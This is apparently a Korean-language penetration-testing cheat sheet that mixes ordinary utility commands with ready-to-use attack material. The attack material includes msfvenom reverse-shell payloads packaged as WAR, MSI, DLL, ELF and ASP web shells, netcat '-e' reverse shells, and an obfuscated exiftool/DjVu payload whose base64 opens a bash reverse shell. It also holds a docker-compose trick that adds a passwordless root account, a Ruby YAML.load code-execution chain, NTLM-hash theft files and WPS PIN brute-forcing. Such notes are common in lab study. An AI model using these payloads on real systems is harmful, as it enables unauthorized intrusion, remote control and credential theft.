# Exploitation Tools and Commands
## unzip
```bash
7z e <zip file>
```
- zip 파일 압축 해제할 때 7z을 쓰면 구조가 일부 깨져있어도 작동한다.
- unzip 대신에 7z을 사용하자.
---

## GCC (GNU Compiler Collection)

### 교차 컴파일 (Cross Compilation)
```bash
# Windows용 바이너리 컴파일
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

### 공유 라이브러리 만들기
```bash
gcc -shared -fPIC ex.c -o ex.so
```

---

## curl
```bash
# Redirection 따라가기
curl -L http://192.168.132.65

# POST 요청
curl -X POST -d 'data=data' <address>
```
- `-L` : redirection

---

## wget
```bash
wget http://ip/test.txt -O /tmp/test.txt
```
- `-O` : 데이터 저장(대문자)
- 혹여나 작동을 안할시 `http://`를 제외해볼것

---

## find
```bash
find . -name '*config*' 2>/dev/null
```

---

## grep
```bash
grep -r pass . 2>/dev/null
```

---

## sqlite3
```bash
sqlite3 {dbname}
.tables
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
select * from user;
.quit
```

---

## msfvenom

### Python 형식
```bash
msfvenom -p windows/shell/reverse_tcp -f python
# 바이트 타입을 명시하기 위해서 b가 붙여서 나옴
```

### C 형식
```bash
msfvenom -p windows/shell/reverse_tcp -f c
# 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴
```

### ELF 공유 라이브러리
```bash
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
```

### WAR 파일 (Java)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

### MSI 파일 (Windows)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
```

### DLL 파일
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

---

## nc (Netcat)

### Windows
```powershell
nc <ip> <port> -e cmd.exe
```

### Linux
```bash
nc <ip> <port> -e /bin/sh
```

### Listener
```bash
nc -vnlp 1234
```

---

## exiftool

### 기본 사용법
```bash
exiftool -a -u brochure.pdf
```

**옵션 설명:**
- `exiftool` : 이미지/문서/영상 파일의 메타데이터를 조회·수정하는 도구
- `-a` (*allow duplicates*) : 중복 키가 있어도 모두 표시
- `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시
- `brochure.pdf` : 대상 파일

### exiftool Code Execution
```bash
# cat payload
(metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMzguNi80NDQ0IDA+JjEK | base64 -d | bash')};")

bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```

---

## swaks (Send Mail Tool)
```bash
swaks --server smtp.example.com \
      --from me@example.com \
      --to you@example.com \
      --auth LOGIN --auth-user me@example.com --auth-password "비밀번호" \
      --attach @test.txt
```

---

## cadaver (WebDAV Client)
```bash
# WebShell 생성
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.2 LPORT=4444 -f asp > shell.asp

# cadaver로 업로드
cadaver <ip>
put shell.asp
```

---

## Reaver (WPS Attack)
```bash
reaver -i <monitor mode interface> -b <target's MAC address> -vv
```
- WPS(Wi-Fi Protected Setup)의 PIN을 이용해 무선 라우터의 WPS 인증을 브루트포스
- 성공하면 라우터의 WPS PIN을 얻고 그로부터 WPA/WPA2 프리-쉐어드키(비밀번호)를 획득

---

## lsof
```bash
sudo lsof -i :8080
```
- 특정 포트를 사용하는 프로세스 확인

---

## tar
```bash
# 압축
tar -cf target.tar foo bar

# 압축 해제
tar -xvzf target.tar
tar -xvzf target.tar.gz
```

---

## gzip
```bash
# 압축 해제
gzip -d <file>
```

---

## vim
```bash
# 정규표현식으로 치환
:%s/D  .*//g
```
- `.*` : 뒤에 모든 문자 선택

```bash
# 중복 제거
:sort i u

# 들여쓰기 정렬
gg=G

:set expandtab
:retab
```

---

## dosbox
- GUI 상태에서 정상 작동

---

## Make Malicious Windows Files
```bash
python3 ntlm_theft.py -g lnk -s <ip> -f vault
```
- https://github.com/Greenwolf/ntlm_theft

---

## docker-compose.yaml Exploit
```bash
# cat docker-compose.yaml
version: "3.8"

services:
  suidbash:
    image: ubuntu:latest
    container_name: suid_bash_container
    volumes:
      - /etc/passwd:/mnt/passwd:rw
    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
    tty: true
```
- root2 유저 추가

---

## Ruby YAML.load Exploit
```bash
# cat ex.yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
- https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

---

## MOSH (Mobile Shell)
<img width="602" height="216" alt="image" src="https://github.com/user-attachments/assets/f1471976-9b5c-49d0-9416-ce866a768be1" />

- SSH의 대안으로 사용되는 모바일 셸

---

## Make ODT File (Libre Office)
- https://github.com/0bfxgh0st/MMG-LO
